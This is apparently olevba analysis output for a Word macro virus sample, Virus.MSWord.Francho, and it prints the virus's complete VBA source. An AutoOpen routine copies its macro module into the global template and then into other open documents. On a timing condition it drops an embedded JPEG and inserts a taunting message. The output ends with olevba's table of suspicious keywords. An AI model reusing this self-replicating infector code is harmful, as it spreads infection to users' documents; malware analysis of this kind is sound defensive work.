olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Francho-307e617ae0e38e42e52f9fa274517843b620ef67
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Francho-307e617ae0e38e42e52f9fa274517843b620ef67 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Francho-307e617ae0e38e42e52f9fa274517843b620ef67 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
' Infector Engine
' (c) 1999 by ?
On Error GoTo error
 

anfitrion = Application.MacroContainer
portador = Application.Documents(1).path + "\" + Application.Documents(1)
globaldot = Application.Templates(1).path + "\" + Application.Templates(1)


If anfitrion = Application.Templates(1) Then GoTo SeEjecutoElGlobal
 

Application.OrganizerDelete Source:=globaldot, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
    

error:
If portador = "" Then GoTo fin
Application.OrganizerCopy Source:=portador, Destination:=globaldot, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems


GoTo fin

SeEjecutoElGlobal:


On Error GoTo fin
For T = 1 To 10
    anfitrion = Application.Documents(T).path + "\" + Application.Documents(T)
    Application.OrganizerCopy Source:=globaldot, Destination:=anfitrion, Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
Next T
fin:


cs = Second(Now())
If (cs > 50) Then
globaldotf = Application.Templates(1).path + "\francho.jpg"
GenBin0 (globaldotf)
    ActiveDocument.Shapes.AddPicture Anchor:=Selection.Range, FileName:= _
        globaldotf, LinkToFile:=False, _
        SaveWithDocument:=True
    Selection.TypeText Text:="Hasta donde crees que puedes llegar hoy ?"
End If

End Sub
Sub GenBin0(spath As String)

Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile(spath, True)

Line = Chr$(255) + Chr$(216) + Chr$(255) + Chr$(224) + Chr$(0) + Chr$(16) + Chr$(74) + Chr$(70) + Chr$(73) + Chr$(70) + Chr$(0) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(0) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(255) + Chr$(219) + Chr$(0) + Chr$(67) + Chr$(0) + Chr$(28) + Chr$(19) + Chr$(21) + Chr$(24) + Chr$(21)
a.Write (Line)
Line = Chr$(17) + Chr$(28) + Chr$(24) + Chr$(22) + Chr$(24) + Chr$(31) + Chr$(29) + Chr$(28) + Chr$(33) + Chr$(41) + Chr$(69) + Chr$(45) + Chr$(41) + Chr$(38) + Chr$(38) + Chr$(41) + Chr$(84) + Chr$(60) + Chr$(64) + Chr$(50) + Chr$(69) + Chr$(100) + Chr$(88) + Chr$(105) + Chr$(103) + Chr$(98) + Chr$(88) + Chr$(96) + Chr$(95) + Chr$(110)
a.Write (Line)
Line = Chr$(124) + Chr$(158) + Chr$(134) + Chr$(110) + Chr$(117) + Chr$(150) + Chr$(119) + Chr$(95) + Chr$(96) + Chr$(138) + Chr$(187) + Chr$(139) + Chr$(150) + Chr$(163) + Chr$(169) + Chr$(177) + Chr$(179) + Chr$(177) + Chr$(107) + Chr$(132) + Chr$(194) + Chr$(208) + Chr$(193) + Chr$(172) + Chr$(206) + Chr$(158) + Chr$(174) + Chr$(177) + Chr$(170) + Chr$(255)
a.Write (Line)
Line = Chr$(219) + Chr$(0) + Chr$(67) + Chr$(1) + Chr$(29) + Chr$(31) + Chr$(31) + Chr$(41) + Chr$(36) + Chr$(41) + Chr$(81) + Chr$(45) + Chr$(45) + Chr$(81) + Chr$(170) + Chr$(114) + Chr$(96) + Chr$(114) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170)
a.Write (Line)
Line = Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170)
a.Write (Line)
Line = Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(170) + Chr$(255) + Chr$(192) + Chr$(0) + Chr$(17) + Chr$(8) + Chr$(0) + Chr$(81) + Chr$(0) + Chr$(68) + Chr$(3) + Chr$(1) + Chr$(34) + Chr$(0) + Chr$(2) + Chr$(17) + Chr$(1) + Chr$(3) + Chr$(17) + Chr$(1) + Chr$(255) + Chr$(196) + Chr$(0)
a.Write (Line)
Line = Chr$(31) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(5) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(4) + Chr$(5) + Chr$(6) + Chr$(7) + Chr$(8) + Chr$(9) + Chr$(10) + Chr$(11)
a.Write (Line)
Line = Chr$(255) + Chr$(196) + Chr$(0) + Chr$(181) + Chr$(16) + Chr$(0) + Chr$(2) + Chr$(1) + Chr$(3) + Chr$(3) + Chr$(2) + Chr$(4) + Chr$(3) + Chr$(5) + Chr$(5) + Chr$(4) + Chr$(4) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(125) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(0) + Chr$(4) + Chr$(17) + Chr$(5) + Chr$(18) + Chr$(33)
a.Write (Line)
Line = Chr$(49) + Chr$(65) + Chr$(6) + Chr$(19) + Chr$(81) + Chr$(97) + Chr$(7) + Chr$(34) + Chr$(113) + Chr$(20) + Chr$(50) + Chr$(129) + Chr$(145) + Chr$(161) + Chr$(8) + Chr$(35) + Chr$(66) + Chr$(177) + Chr$(193) + Chr$(21) + Chr$(82) + Chr$(209) + Chr$(240) + Chr$(36) + Chr$(51) + Chr$(98) + Chr$(114) + Chr$(130) + Chr$(9) + Chr$(10)
a.Write (Line)
Line = Chr$(22) + Chr$(23) + Chr$(24) + Chr$(25) + Chr$(26) + Chr$(37) + Chr$(38) + Chr$(39) + Chr$(40) + Chr$(41) + Chr$(42) + Chr$(52) + Chr$(53) + Chr$(54) + Chr$(55) + Chr$(56) + Chr$(57) + Chr$(58) + Chr$(67) + Chr$(68) + Chr$(69) + Chr$(70) + Chr$(71) + Chr$(72) + Chr$(73) + Chr$(74) + Chr$(83) + Chr$(84) + Chr$(85) + Chr$(86)
a.Write (Line)
Line = Chr$(87) + Chr$(88) + Chr$(89) + Chr$(90) + Chr$(99) + Chr$(100) + Chr$(101) + Chr$(102) + Chr$(103) + Chr$(104) + Chr$(105) + Chr$(106) + Chr$(115) + Chr$(116) + Chr$(117) + Chr$(118) + Chr$(119) + Chr$(120) + Chr$(121) + Chr$(122) + Chr$(131) + Chr$(132) + Chr$(133) + Chr$(134) + Chr$(135) + Chr$(136) + Chr$(137) + Chr$(138) + Chr$(146) + Chr$(147)
a.Write (Line)
Line = Chr$(148) + Chr$(149) + Chr$(150) + Chr$(151) + Chr$(152) + Chr$(153) + Chr$(154) + Chr$(162) + Chr$(163) + Chr$(164) + Chr$(165) + Chr$(166) + Chr$(167) + Chr$(168) + Chr$(169) + Chr$(170) + Chr$(178) + Chr$(179) + Chr$(180) + Chr$(181) + Chr$(182) + Chr$(183) + Chr$(184) + Chr$(185) + Chr$(186) + Chr$(194) + Chr$(195) + Chr$(196) + Chr$(197) + Chr$(198)
a.Write (Line)
Line = Chr$(199) + Chr$(200) + Chr$(201) + Chr$(202) + Chr$(210) + Chr$(211) + Chr$(212) + Chr$(213) + Chr$(214) + Chr$(215) + Chr$(216) + Chr$(217) + Chr$(218) + Chr$(225) + Chr$(226) + Chr$(227) + Chr$(228) + Chr$(229) + Chr$(230) + Chr$(231) + Chr$(232) + Chr$(233) + Chr$(234) + Chr$(241) + Chr$(242) + Chr$(243) + Chr$(244) + Chr$(245) + Chr$(246) + Chr$(247)
a.Write (Line)
Line = Chr$(248) + Chr$(249) + Chr$(250) + Chr$(255) + Chr$(196) + Chr$(0) + Chr$(31) + Chr$(1) + Chr$(0) + Chr$(3) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(1) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(3) + Chr$(4) + Chr$(5)
a.Write (Line)
Line = Chr$(6) + Chr$(7) + Chr$(8) + Chr$(9) + Chr$(10) + Chr$(11) + Chr$(255) + Chr$(196) + Chr$(0) + Chr$(181) + Chr$(17) + Chr$(0) + Chr$(2) + Chr$(1) + Chr$(2) + Chr$(4) + Chr$(4) + Chr$(3) + Chr$(4) + Chr$(7) + Chr$(5) + Chr$(4) + Chr$(4) + Chr$(0) + Chr$(1) + Chr$(2) + Chr$(119) + Chr$(0) + Chr$(1) + Chr$(2)
a.Write (Line)
Line = Chr$(3) + Chr$(17) + Chr$(4) + Chr$(5) + Chr$(33) + Chr$(49) + Chr$(6) + Chr$(18) + Chr$(65) + Chr$(81) + Chr$(7) + Chr$(97) + Chr$(113) + Chr$(19) + Chr$(34) + Chr$(50) + Chr$(129) + Chr$(8) + Chr$(20) + Chr$(66) + Chr$(145) + Chr$(161) + Chr$(177) + Chr$(193) + Chr$(9) + Chr$(35) + Chr$(51) + Chr$(82) + Chr$(240) + Chr$(21)
a.Write (Line)
Line = Chr$(98) + Chr$(114) + Chr$(209) + Chr$(10) + Chr$(22) + Chr$(36) + Chr$(52) + Chr$(225) + Chr$(37) + Chr$(241) + Chr$(23) + Chr$(24) + Chr$(25) + Chr$(26) + Chr$(38) + Chr$(39) + Chr$(40) + Chr$(41) + Chr$(42) + Chr$(53) + Chr$(54) + Chr$(55) + Chr$(56) + Chr$(57) + Chr$(58) + Chr$(67) + Chr$(68) + Chr$(69) + Chr$(70) + Chr$(71)
a.Write (Line)
Line = Chr$(72) + Chr$(73) + Chr$(74) + Chr$(83) + Chr$(84) + Chr$(85) + Chr$(86) + Chr$(87) + Chr$(88) + Chr$(89) + Chr$(90) + Chr$(99) + Chr$(100) + Chr$(101) + Chr$(102) + Chr$(103) + Chr$(104) + Chr$(105) + Chr$(106) + Chr$(115) + Chr$(116) + Chr$(117) + Chr$(118) + Chr$(119) + Chr$(120) + Chr$(121) + Chr$(122) + Chr$(130) + Chr$(131) + Chr$(132)
a.Write (Line)
Line = Chr$(133) + Chr$(134) + Chr$(135) + Chr$(136) + Chr$(137) + Chr$(138) + Chr$(146) + Chr$(147) + Chr$(148) + Chr$(149) + Chr$(150) + Chr$(151) + Chr$(152) + Chr$(153) + Chr$(154) + Chr$(162) + Chr$(163) + Chr$(164) + Chr$(165) + Chr$(166) + Chr$(167) + Chr$(168) + Chr$(169) + Chr$(170) + Chr$(178) + Chr$(179) + Chr$(180) + Chr$(181) + Chr$(182) + Chr$(183)
a.Write (Line)
Line = Chr$(184) + Chr$(185) + Chr$(186) + Chr$(194) + Chr$(195) + Chr$(196) + Chr$(197) + Chr$(198) + Chr$(199) + Chr$(200) + Chr$(201) + Chr$(202) + Chr$(210) + Chr$(211) + Chr$(212) + Chr$(213) + Chr$(214) + Chr$(215) + Chr$(216) + Chr$(217) + Chr$(218) + Chr$(226) + Chr$(227) + Chr$(228) + Chr$(229) + Chr$(230) + Chr$(231) + Chr$(232) + Chr$(233) + Chr$(234)
a.Write (Line)
Line = Chr$(242) + Chr$(243) + Chr$(244) + Chr$(245) + Chr$(246) + Chr$(247) + Chr$(248) + Chr$(249) + Chr$(250) + Chr$(255) + Chr$(218) + Chr$(0) + Chr$(12) + Chr$(3) + Chr$(1) + Chr$(0) + Chr$(2) + Chr$(17) + Chr$(3) + Chr$(17) + Chr$(0) + Chr$(63) + Chr$(0) + Chr$(232) + Chr$(113) + Chr$(65) + Chr$(28) + Chr$(82) + Chr$(230) + Chr$(162)
a.Write (Line)
Line = Chr$(184) + Chr$(157) + Chr$(32) + Chr$(136) + Chr$(200) + Chr$(231) + Chr$(129) + Chr$(76) + Chr$(130) + Chr$(25) + Chr$(184) + Chr$(57) + Chr$(172) + Chr$(233) + Chr$(117) + Chr$(27) + Chr$(100) + Chr$(109) + Chr$(165) + Chr$(201) + Chr$(35) + Chr$(208) + Chr$(86) + Chr$(125) + Chr$(253) + Chr$(252) + Chr$(183) + Chr$(14) + Chr$(73) + Chr$(98)
a.Write (Line)
Line = Chr$(171) + Chr$(217) + Chr$(69) + Chr$(103) + Chr$(51) + Chr$(18) + Chr$(106) + Chr$(174) + Chr$(79) + Chr$(179) + Chr$(79) + Chr$(115) + Chr$(160) + Chr$(143) + Chr$(84) + Chr$(181) + Chr$(25) + Chr$(249) + Chr$(207) + Chr$(229) + Chr$(78) + Chr$(109) + Chr$(74) + Chr$(218) + Chr$(81) + Chr$(128) + Chr$(248) + Chr$(62) + Chr$(245) + Chr$(206)
a.Write (Line)
Line = Chr$(112) + Chr$(59) + Chr$(210) + Chr$(110) + Chr$(57) + Chr$(200) + Chr$(163) + Chr$(155) + Chr$(81) + Chr$(251) + Chr$(40) + Chr$(218) + Chr$(198) + Chr$(228) + Chr$(196) + Chr$(48) + Chr$(36) + Chr$(28) + Chr$(143) + Chr$(106) + Chr$(85) + Chr$(21) + Chr$(153) + Chr$(109) + Chr$(114) + Chr$(64) + Chr$(242) + Chr$(220) + Chr$(228) + Chr$(30)
a.Write (Line)
Line = Chr$(134) + Chr$(181) + Chr$(19) + Chr$(165) + Chr$(111) + Chr$(25) + Chr$(93) + Chr$(28) + Chr$(243) + Chr$(143) + Chr$(40) + Chr$(245) + Chr$(28) + Chr$(82) + Chr$(226) + Chr$(149) + Chr$(122) + Chr$(82) + Chr$(226) + Chr$(131) + Chr$(51) + Chr$(102) + Chr$(176) + Chr$(245) + Chr$(139) + Chr$(146) + Chr$(242) + Chr$(249) + Chr$(43) + Chr$(247)
a.Write (Line)
Line = Chr$(84) + Chr$(243) + Chr$(245) + Chr$(173) + Chr$(182) + Chr$(56) + Chr$(21) + Chr$(206) + Chr$(198) + Chr$(4) + Chr$(186) + Chr$(137) + Chr$(18) + Chr$(12) + Chr$(134) + Chr$(99) + Chr$(92) + Chr$(199) + Chr$(114) + Chr$(51) + Chr$(102) + Chr$(193) + Chr$(53) + Chr$(36) + Chr$(54) + Chr$(134) + Chr$(76) + Chr$(28) + Chr$(30) + Chr$(120)
a.Write (Line)
Line = Chr$(197) + Chr$(106) + Chr$(205) + Chr$(5) + Chr$(132) + Chr$(50) + Chr$(252) + Chr$(197) + Chr$(119) + Chr$(122) + Chr$(19) + Chr$(154) + Chr$(177) + Chr$(26) + Chr$(164) + Chr$(139) + Chr$(152) + Chr$(216) + Chr$(17) + Chr$(237) + Chr$(69) + Chr$(203) + Chr$(49) + Chr$(155) + Chr$(74) + Chr$(112) + Chr$(126) + Chr$(86) + Chr$(4) + Chr$(122)
a.Write (Line)
Line = Chr$(82) + Chr$(29) + Chr$(56) + Chr$(170) + Chr$(243) + Chr$(214) + Chr$(182) + Chr$(101) + Chr$(217) + Chr$(31) + Chr$(46) + Chr$(192) + Chr$(125) + Chr$(106) + Chr$(7) + Chr$(146) + Chr$(54) + Chr$(7) + Chr$(107) + Chr$(131) + Chr$(244) + Chr$(169) + Chr$(3) + Chr$(2) + Chr$(68) + Chr$(49) + Chr$(190) + Chr$(13) + Chr$(107) + Chr$(89)
a.Write (Line)
Line = Chr$(204) + Chr$(37) + Chr$(132) + Chr$(28) + Chr$(242) + Chr$(56) + Chr$(53) + Chr$(66) + Chr$(255) + Chr$(0) + Chr$(30) + Chr$(96) + Chr$(20) + Chr$(237) + Chr$(60) + Chr$(225) + Chr$(219) + Chr$(240) + Chr$(173) + Chr$(105) + Chr$(189) + Chr$(76) + Chr$(170) + Chr$(198) + Chr$(241) + Chr$(54) + Chr$(87) + Chr$(165) + Chr$(46) + Chr$(41)
a.Write (Line)
Line = Chr$(169) + Chr$(157) + Chr$(162) + Chr$(157) + Chr$(91) + Chr$(28) + Chr$(102) + Chr$(149) + Chr$(196) + Chr$(241) + Chr$(194) + Chr$(160) + Chr$(200) + Chr$(112) + Chr$(13) + Chr$(97) + Chr$(196) + Chr$(124) + Chr$(203) + Chr$(213) + Chr$(217) + Chr$(221) + Chr$(243) + Chr$(91) + Chr$(151) + Chr$(17) + Chr$(44) + Chr$(209) + Chr$(149) + Chr$(113)
a.Write (Line)
Line = Chr$(145) + Chr$(89) + Chr$(246) + Chr$(182) + Chr$(194) + Chr$(27) + Chr$(197) + Chr$(36) + Chr$(231) + Chr$(57) + Chr$(197) + Chr$(115) + Chr$(116) + Chr$(59) + Chr$(162) + Chr$(67) + Chr$(116) + Chr$(138) + Chr$(132) + Chr$(237) + Chr$(135) + Chr$(118) + Chr$(79) + Chr$(60) + Chr$(115) + Chr$(75) + Chr$(108) + Chr$(118) + Chr$(51) + Chr$(42)
a.Write (Line)
Line = Chr$(174) + Chr$(0) + Chr$(29) + Chr$(170) + Chr$(244) + Chr$(136) + Chr$(11) + Chr$(84) + Chr$(126) + Chr$(88) + Chr$(17) + Chr$(177) + Chr$(29) + Chr$(77) + Chr$(73) + Chr$(101) + Chr$(11) + Chr$(146) + Chr$(39) + Chr$(109) + Chr$(172) + Chr$(58) + Chr$(122) + Chr$(213) + Chr$(117) + Chr$(142) + Chr$(23) + Chr$(192) + Chr$(17) + Chr$(24)
a.Write (Line)
Line = Chr$(207) + Chr$(99) + Chr$(87) + Chr$(99) + Chr$(64) + Chr$(100) + Chr$(108) + Chr$(243) + Chr$(220) + Chr$(84) + Chr$(143) + Chr$(24) + Chr$(219) + Chr$(158) + Chr$(244) + Chr$(1) + Chr$(207) + Chr$(94) + Chr$(18) + Chr$(178) + Chr$(237) + Chr$(99) + Chr$(200) + Chr$(167) + Chr$(216) + Chr$(182) + Chr$(217) + Chr$(48) + Chr$(123) + Chr$(211)
a.Write (Line)
Line = Chr$(181) + Chr$(52) + Chr$(45) + Chr$(50) + Chr$(129) + Chr$(215) + Chr$(20) + Chr$(182) + Chr$(118) + Chr$(178) + Chr$(151) + Chr$(12) + Chr$(202) + Chr$(66) + Chr$(138) + Chr$(210) + Chr$(61) + Chr$(8) + Chr$(150) + Chr$(204) + Chr$(217) + Chr$(143) + Chr$(148) + Chr$(20) + Chr$(234) + Chr$(72) + Chr$(198) + Chr$(16) + Chr$(10) + Chr$(117)
a.Write (Line)
Line = Chr$(108) + Chr$(112) + Chr$(154) + Chr$(141) + Chr$(200) + Chr$(170) + Chr$(211) + Chr$(97) + Chr$(66) + Chr$(184) + Chr$(31) + Chr$(50) + Chr$(176) + Chr$(205) + Chr$(76) + Chr$(138) + Chr$(255) + Chr$(0) + Chr$(196) + Chr$(216) + Chr$(162) + Chr$(84) + Chr$(202) + Chr$(48) + Chr$(29) + Chr$(72) + Chr$(172) + Chr$(14) + Chr$(180) + Chr$(250)
a.Write (Line)
Line = Chr$(153) + Chr$(154) + Chr$(141) + Chr$(232) + Chr$(128) + Chr$(129) + Chr$(25) + Chr$(4) + Chr$(154) + Chr$(164) + Chr$(186) + Chr$(195) + Chr$(253) + Chr$(214) + Chr$(65) + Chr$(182) + Chr$(160) + Chr$(184) + Chr$(33) + Chr$(103) + Chr$(196) + Chr$(128) + Chr$(250) + Chr$(16) + Chr$(123) + Chr$(81) + Chr$(230) + Chr$(42) + Chr$(227) + Chr$(16)
a.Write (Line)
Line = Chr$(43) + Chr$(122) + Chr$(19) + Chr$(82) + Chr$(108) + Chr$(60) + Chr$(106) + Chr$(108) + Chr$(28) + Chr$(157) + Chr$(188) + Chr$(14) + Chr$(149) + Chr$(114) + Chr$(43) + Chr$(196) + Chr$(157) + Chr$(24) + Chr$(142) + Chr$(8) + Chr$(25) + Chr$(35) + Chr$(210) + Chr$(179) + Chr$(220) + Chr$(163) + Chr$(227) + Chr$(48) + Chr$(4) + Chr$(7)
a.Write (Line)
Line = Chr$(169) + Chr$(6) + Chr$(171) + Chr$(9) + Chr$(0) + Chr$(47) + Chr$(179) + Chr$(32) + Chr$(26) + Chr$(44) + Chr$(6) + Chr$(141) + Chr$(188) + Chr$(176) + Chr$(188) + Chr$(242) + Chr$(153) + Chr$(8) + Chr$(221) + Chr$(198) + Chr$(208) + Chr$(69) + Chr$(91) + Chr$(201) + Chr$(99) + Chr$(146) + Chr$(115) + Chr$(89) + Chr$(154) + Chr$(124)
a.Write (Line)
Line = Chr$(123) + Chr$(153) + Chr$(156) + Chr$(253) + Chr$(5) + Chr$(106) + Chr$(37) + Chr$(107) + Chr$(8) + Chr$(219) + Chr$(83) + Chr$(154) + Chr$(172) + Chr$(254) + Chr$(202) + Chr$(30) + Chr$(58) + Chr$(81) + Chr$(64) + Chr$(233) + Chr$(75) + Chr$(86) + Chr$(115) + Chr$(154) + Chr$(99) + Chr$(154) + Chr$(70) + Chr$(28) + Chr$(80) + Chr$(51)
a.Write (Line)
Line = Chr$(138) + Chr$(43) + Chr$(3) + Chr$(172) + Chr$(195) + Chr$(214) + Chr$(172) + Chr$(216) + Chr$(176) + Chr$(154) + Chr$(49) + Chr$(159) + Chr$(239) + Chr$(10) + Chr$(204) + Chr$(142) + Chr$(232) + Chr$(198) + Chr$(152) + Chr$(32) + Chr$(87) + Chr$(81) + Chr$(54) + Chr$(15) + Chr$(28) + Chr$(19) + Chr$(212) + Chr$(138) + Chr$(161) + Chr$(45)
a.Write (Line)
Line = Chr$(165) + Chr$(179) + Chr$(72) + Chr$(75) + Chr$(66) + Chr$(191) + Chr$(149) + Chr$(23) + Chr$(52) + Chr$(142) + Chr$(198) + Chr$(44) + Chr$(215) + Chr$(38) + Chr$(101) + Chr$(8) + Chr$(51) + Chr$(244) + Chr$(167) + Chr$(90) + Chr$(90) + Chr$(59) + Chr$(157) + Chr$(242) + Chr$(12) + Chr$(39) + Chr$(167) + Chr$(173) + Chr$(106) + Chr$(27)
a.Write (Line)
Line = Chr$(104) + Chr$(84) + Chr$(254) + Chr$(238) + Chr$(53) + Chr$(95) + Chr$(160) + Chr$(169) + Chr$(93) + Chr$(54) + Chr$(167) + Chr$(225) + Chr$(74) + Chr$(229) + Chr$(21) + Chr$(227) + Chr$(10) + Chr$(167) + Chr$(0) + Chr$(98) + Chr$(167) + Chr$(74) + Chr$(129) + Chr$(136) + Chr$(92) + Chr$(28) + Chr$(231) + Chr$(176) + Chr$(52) + Chr$(228)
a.Write (Line)
Line = Chr$(156) + Chr$(96) + Chr$(250) + Chr$(142) + Chr$(181) + Chr$(212) + Chr$(162) + Chr$(218) + Chr$(56) + Chr$(166) + Chr$(181) + Chr$(101) + Chr$(160) + Chr$(56) + Chr$(163) + Chr$(20) + Chr$(200) + Chr$(228) + Chr$(87) + Chr$(64) + Chr$(202) + Chr$(120) + Chr$(52) + Chr$(237) + Chr$(222) + Chr$(226) + Chr$(166) + Chr$(204) + Chr$(131) + Chr$(79)
a.Write (Line)
Line = Chr$(181) + Chr$(33) + Chr$(233) + Chr$(75) + Chr$(218) + Chr$(144) + Chr$(244) + Chr$(172) + Chr$(14) + Chr$(162) + Chr$(171) + Chr$(127) + Chr$(199) + Chr$(219) + Chr$(255) + Chr$(0) + Chr$(184) + Chr$(63) + Chr$(153) + Chr$(168) + Chr$(102) + Chr$(169) + Chr$(155) + Chr$(254) + Chr$(62) + Chr$(223) + Chr$(253) + Chr$(193) + Chr$(252) + Chr$(205)
a.Write (Line)
Line = Chr$(67) + Chr$(53) + Chr$(18) + Chr$(46) + Chr$(59) + Chr$(8) + Chr$(191) + Chr$(195) + Chr$(68) + Chr$(223) + Chr$(112) + Chr$(80) + Chr$(191) + Chr$(195) + Chr$(68) + Chr$(223) + Chr$(112) + Chr$(84) + Chr$(150) + Chr$(82) + Chr$(254) + Chr$(35) + Chr$(254) + Chr$(253) + Chr$(74) + Chr$(223) + Chr$(125) + Chr$(190) + Chr$(149) + Chr$(23)
a.Write (Line)
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

